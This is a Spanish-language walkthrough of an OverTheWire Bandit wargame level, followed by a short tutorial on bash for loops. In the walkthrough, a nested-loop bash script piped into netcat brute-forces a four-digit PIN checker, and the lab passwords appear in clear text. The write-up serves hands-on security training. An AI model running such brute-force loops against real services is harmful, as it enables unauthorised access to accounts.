## Objetivo:
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time.

## Datos de acceso al nivel:
- **Host: bandit.labs.overthewire.org** 
- **Port:** 2220
- **User:** bandit24
- **Password:** VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

## Solución:
Lo que nos dice el reto es que, debemos conectarnos al puerto 30002 y debemos ingresar la password de `bandit24` y un _PIN_. Si intentamos conectarnos al puerto, este nos indica que debemos ingresar la password, seguido de un espacio y luego este PIN de cuatro dígitos:

```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 2309
Wrong! Please enter the correct pincode. Try again.
^C
bandit24@bandit:~$
```

Por lo tanto, creamos una carpeta en el directorio `/tmp` para crear un script y hacer fuerza bruta del _PIN_:

```bash
bandit24@bandit:~$ mkdir /tmp/tmp-bandit24
bandit24@bandit:~$ cd /tmp/tmp-bandit24
bandit24@bandit:/tmp/tmp-bandit24$ ls
bandit24@bandit:/tmp/tmp-bandit24$
```

El siguiente script lo que hace es mandar la password seguido por 4 dígitos, partiendo por `0000` hasta llegar a `9999`:

```bash
bandit24@bandit:/tmp/tmp-bandit24$ nano scriptPIN.sh

bandit24@bandit:/tmp/tmp-bandit24$ cat scriptPIN.sh
#!/bin/bash

for a in {0..9}
do
        for e in {0..9}
        do
                for i in {0..9}
                do
                        for o in {0..9}
                        do
                                echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $a$e$i$o"
                        done
                done
        done
done
bandit24@bandit:/tmp/tmp-bandit24$
```

A este le damos permisos de ejecución:

```bash
bandit24@bandit:/tmp/tmp-bandit24$ chmod +x scriptPIN.sh
bandit24@bandit:/tmp/tmp-bandit24$ ls -la scriptPIN.sh
-rwxrwxr-x 1 bandit24 bandit24 181 Feb 24 00:14 scriptPIN.sh
bandit24@bandit:/tmp/tmp-bandit24$
```

Y le pasamos este script al comando `netcat`:

```bash
bandit24@bandit:/tmp/tmp-bandit24$ ./scriptPIN.sh | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
...
```

Una vez mandado el _PIN_ correcto, la conexión nos muestra la contraseña del siguiente reto y cierra la conexión:

```bash
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:/tmp/tmp-bandit24$
```

## Notas adicionales:
En el lenguaje de programación Bash, también es posible utilizar ciclos . Los ciclos se utilizan cuando se necesita ejecutar un bloque de instrucciones varias veces, hasta que, o mientras que, se cumpla una condición dada.

## **For**

Los ciclos `for` permiten ejecutar una o varias instrucciones de forma iterativa. Son utilizados cuando se conoce el valor inicial y el valor final de las iteraciones, además permite indicar el tamaño del salto entre una iteración y otra.

### **Sintaxis**

Existen varias formas de utilizar el ciclo for. La que se muestra a continuación es la sintaxis heredada del lenguaje de programación C.

```bash
for (( inicializador; condición; contador ))
do
#Instrucciones
done
```

El inicializador es el valor inicial con que comenzará el ciclo. La condición es el valor final, el valor con que se detendrá el ciclo. El contador es el encargado de incrementar o decrementar, según sea el caso, el salto entre una iteración y otra.

También puede ser utilizado con listas de la siguiente forma:

```bash
for i in lista
do
#Instrucciones
done
```

Donde i toma el valor de la iteración actual en la lista dada.

Si lo que se necesita es especificar un rango de valores, puede ser combinado con el comando `seq` de la siguiente forma:

```bash
for i in $(seq rango)
do
#Instrucciones
done
```

## Referencias:
- https://www.hostinger.mx/tutoriales/bash-for-loop-guia-ejemplos